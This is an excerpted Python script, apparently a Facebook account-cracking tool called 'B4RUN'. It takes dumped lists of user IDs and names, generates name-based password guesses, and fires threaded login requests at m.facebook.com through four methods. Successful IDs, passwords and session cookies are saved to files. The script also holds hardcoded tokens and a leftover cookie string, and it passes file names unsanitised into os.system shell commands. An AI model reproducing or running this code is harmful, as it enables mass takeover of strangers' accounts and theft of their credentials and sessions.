...
from concurrent.futures import ThreadPoolExecutor as BarunB4RUN
from string import * 
...
sys.stdout.write('\x1b]2; B4RUN\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back B4RUN Menu ")
        exit()
...
def Barun():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open 9765295170')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/Newarrinxide?mibextid=rS40aB7S9Ucbxw6v')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        B4RUN(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[B4RUN] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    # 'cookie': 'datr=d7SPZfUqRVjFrYyAVU6hXW7O; sb=d7SPZYKUQ5iMJ8VchyJ8aSwx; locale=en_US; vpd=v1%3B768x400x1.8000000715255737; wl_cbv=v2%3Bclient_version%3A2390%3Btimestamp%3A1704567928; m_pixel_ratio=1.8000000715255737; wd=400x768; fr=0Xd1lwdb9tGj1qs5E.AWWSkOVRGd8AcFpox3T0Bxfxirw.Blj7R3.sH.AAA.0.0.BlmaUk.AWUSePcIgNw',
    'dpr': '1.8000000715255737',
    'referer': 'https://m.facebook.com/?_se_imp=0axFDJiOpOAU38AlK',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X689F"',
    ...
    'viewport-width': '980',
                ...
                q = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);B4RUNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={B4RUNb};{ckkk}"
                    print(f"\r{R} [B4RUN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/B4RUN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/B4RUN_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [B4RUN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/B4RUN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[B4RUN] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [B4RUN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/B4RUN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/B4RUN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [B4RUN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[B4RUN] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[B4RUN] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [B4RUN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/B4RUN_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with BarunB4RUN(max_workers=30) as B4RUNworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                B4RUNworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                B4RUNworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                B4RUNworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                B4RUNworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/B4RUN.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/B4RUN.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    B4RUN = input('Put File Name :')
    print(" ")
    Barun = input('Saving Put File Name :')
    os.system('touch ' +Barun)
    os.system('sort -r '+B4RUN+' | uniq > '+Barun)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + B4RUN )
    print(47*'-')
    print("File Saved To :" + Barun )
    print(47*'-')
    input(f"{S} Press Enter To Back B4RUN Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/B4RUN.txt\n') 
        filepath = input("Put File Name: ")
